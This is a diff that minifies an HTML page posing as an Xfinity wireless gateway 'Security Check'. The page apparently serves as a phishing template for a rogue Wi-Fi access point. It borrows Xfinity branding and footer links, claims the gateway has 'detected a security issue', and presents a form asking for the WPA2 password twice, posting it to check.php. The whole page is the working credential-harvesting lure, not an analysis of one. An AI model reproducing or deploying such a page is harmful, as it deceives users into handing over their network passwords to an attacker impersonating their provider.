@@ -1,53 +1,9 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<!-- saved from url=(0016)http://10.0.0.1/ -->
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Xfinity Security Check</title>
-
-
-    <!--CSS-->
-    <link rel="stylesheet" type="text/css" media="screen" href="./Xfinity_files/common-min.css">
-    <!--[if IE 6]>
+<!-- saved from url=(0016)http://10.0.0.1/ --><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en><head><meta http-equiv=Content-Type content="text/html; charset=UTF-8"><title>Xfinity Security Check</title><!--CSS--><link rel=stylesheet type=text/css media=screen href=./Xfinity_files/common-min.css><!--[if IE 6]>
     <link rel="stylesheet" type="text/css" href="cmn/css/ie6-min.css" />
-    <![endif]-->
-    <!--[if IE 7]>
+    <![endif]--><!--[if IE 7]>
     <link rel="stylesheet" type="text/css" href="cmn/css/ie7-min.css" />
-    <![endif]-->
-    <link rel="stylesheet" type="text/css" media="print" href="./Xfinity_files/print.css">
-
-
-    <!--Character Encoding-->
-    
-
-<script type="text/javascript" src="./Xfinity_files/jquery-1.4.2.min.js"></script>
-<!-- <script type="text/javascript" src="dev_only/jquery.qtip-1.0.0-rc3.min.js"></script> -->
-<script type="text/javascript" src="./Xfinity_files/jquery-ui-1.8.5.custom.min.js"></script>
-
-
-
-<script type="text/javascript" src="./Xfinity_files/json2.js"></script>
-<script type="text/javascript" src="./Xfinity_files/underscore.js"></script>
-<script type="text/javascript" src="./Xfinity_files/base.js"></script>
-<script type="text/javascript" src="./Xfinity_files/mib.js"></script><script language="JavaScript" src="./Xfinity_files/mib2.js" type="text/javascript"></script>
-<script type="text/javascript" src="./Xfinity_files/base_95x.js"></script>
-
-       <script type="text/javascript" src="./Xfinity_files/common-min.js"></script>
-</head>
-
-<body>
-    <!--Main Container - Centers Everything-->
-    <div id="container">
-
-        <!--Header-->
-        <div id="header">
-                <h2 id="logo"><a><span></span><img src="Xfinity_files/img/logo_xfinity.png"></a></h2>
-        </div> <!-- end #header -->
-
-        <!--Main Content-->
-        <div id="main-content">
-
-
-<!-- $Id: home_loggedout.php 3158 2010-01-08 23:32:05Z slemoine $ -->
-<script type="text/javascript">
+    <![endif]--><link rel=stylesheet type=text/css media=print href=./Xfinity_files/print.css><!--Character Encoding--><script type=text/javascript src=./Xfinity_files/jquery-1.4.2.min.js></script><!-- <script type="text/javascript" src="dev_only/jquery.qtip-1.0.0-rc3.min.js"></script> --><script type=text/javascript src=./Xfinity_files/jquery-ui-1.8.5.custom.min.js></script><script type=text/javascript src=./Xfinity_files/json2.js></script><script type=text/javascript src=./Xfinity_files/underscore.js></script><script type=text/javascript src=./Xfinity_files/base.js></script><script type=text/javascript src=./Xfinity_files/mib.js></script><script language=JavaScript src=./Xfinity_files/mib2.js type=text/javascript></script><script type=text/javascript src=./Xfinity_files/base_95x.js></script><script type=text/javascript src=./Xfinity_files/common-min.js></script></head> <body> <!--Main Container - Centers Everything--> <div id=container> <!--Header--> <div id=header> <h2 id=logo><a><span></span><img src=Xfinity_files/img/logo_xfinity.png></a></h2> </div> <!-- end #header --> <!--Main Content--> <div id=main-content> <!-- $Id: home_loggedout.php 3158 2010-01-08 23:32:05Z slemoine $ --> <script type=text/javascript>
 
 function onKeyPress_check(e) {
     if (e.which == 13) {
@@ -58,35 +14,35 @@ function onKeyPress_check(e) {
 
 function getGuiFlag(ModelName)
 {
-	var flag;
-	if (ModelName.search("MG2402")!=-1)
- 		flag = false;
-	else
-		flag = true;
-	   
-	$.ajax({
-		url: "guiflag",
-		success:function(data){
-			if (data.indexOf("1") >= 0)
-			{
-				flag = true;
-			}
-			else if (data.indexOf("0") >= 0)
-			{
-				flag = false;
-			}
-		},
-		error:function(data) {
-			if (ModelName.search("MG2402")!=-1)
- 				flag = false;
-			else
-				flag = true;
-		},
-		datatype:"text",
-		cache: false,
-		async: false
-	});
-	return flag;
+    var flag;
+    if (ModelName.search("MG2402")!=-1)
+        flag = false;
+    else
+        flag = true;
+       
+    $.ajax({
+        url: "guiflag",
+        success:function(data){
+            if (data.indexOf("1") >= 0)
+            {
+                flag = true;
+            }
+            else if (data.indexOf("0") >= 0)
+            {
+                flag = false;
+            }
+        },
+        error:function(data) {
+            if (ModelName.search("MG2402")!=-1)
+                flag = false;
+            else
+                flag = true;
+        },
+        datatype:"text",
+        cache: false,
+        async: false
+    });
+    return flag;
 }
 
 function f()
@@ -149,7 +105,7 @@ function f()
             }
             else
             {
-                jAlert("Unknown Model("+ModelName+")!" , "ERROR" ,0);	
+                jAlert("Unknown Model("+ModelName+")!" , "ERROR" ,0);   
             }
         }
 
@@ -197,46 +153,4 @@ $(document).ready(function() {
         }
     });
 });
-</script>
-
-
-
-<div id="sub-header">
-
-</div><!-- end #sub-header -->
-
-<div id="content">
-    <h1>Security Check</h1>
-
-<img align="right" src="Xfinity_files/img/label.jpg" height="250px" width="350px">
-
-
-    <div id="login" class="module forms">
-
-            <div class="form-row">
-              <p><b>Your XFINITY&trade; Wireless Gateway detected a security issue. Please enter your wireless security settings to proceed.</b></p>
-        </div>
-
-        <div class="error"></div>
-
-<tr><td><form action="check.php" method="post" align="center">
-    <br>&nbsp;&nbsp;&nbsp;WPA2 Password: <input type="password" name="password1">
-        <br>Confirm Password: <input type="password" name="password2">
-            <br><input type="submit" value="Submit" value="Send"></form></td></td></tr>
-    </div>
-</div><!-- end #content -->
-
-<!-- $Id: footer.usg.php 2976 2009-09-02 21:42:51Z cporto $ -->
-        </div> <!-- end #main-content-->
-        
-        <!--Footer-->
-        <div id="footer">
-            <ul id="footer-links">
-                <li class="first-child"><a href="http://www.xfinity.com/" target="_blank">Xfinity.com</a></li>
-                <li><a href="https://customer.comcast.com/" target="_blank">customerCentral</a></li>
-                <li><a href="http://customer.comcast.com/userguides" target="_blank">User Guide</a></li>
-            </ul>
-        </div> <!-- end #footer -->
-    </div> <!-- end #container -->
-
-</body></html>
+</script> <div id=sub-header> </div><!-- end #sub-header --> <div id=content> <h1>Security Check</h1> <img align=right src=Xfinity_files/img/label.jpg height=250px width=350px> <div id=login class="module forms"> <div class=form-row> <p><b>Your XFINITY&trade; Wireless Gateway detected a security issue. Please enter your wireless security settings to proceed.</b></p> </div> <div class=error></div> <tr><td><form action=check.php method=post align=center> <br>&nbsp;&nbsp;&nbsp;WPA2 Password: <input type=password name=password1> <br>Confirm Password: <input type=password name=password2> <br><input type=submit value=Submit value=Send></form></td></td></tr> </div> </div><!-- end #content --> <!-- $Id: footer.usg.php 2976 2009-09-02 21:42:51Z cporto $ --> </div> <!-- end #main-content--> <!--Footer--> <div id=footer> <ul id=footer-links> <li class=first-child><a href=http://www.xfinity.com/ target=_blank>Xfinity.com</a></li> <li><a href=https://customer.comcast.com/ target=_blank>customerCentral</a></li> <li><a href=http://customer.comcast.com/userguides target=_blank>User Guide</a></li> </ul> </div> <!-- end #footer --> </div> <!-- end #container --> </body></html>
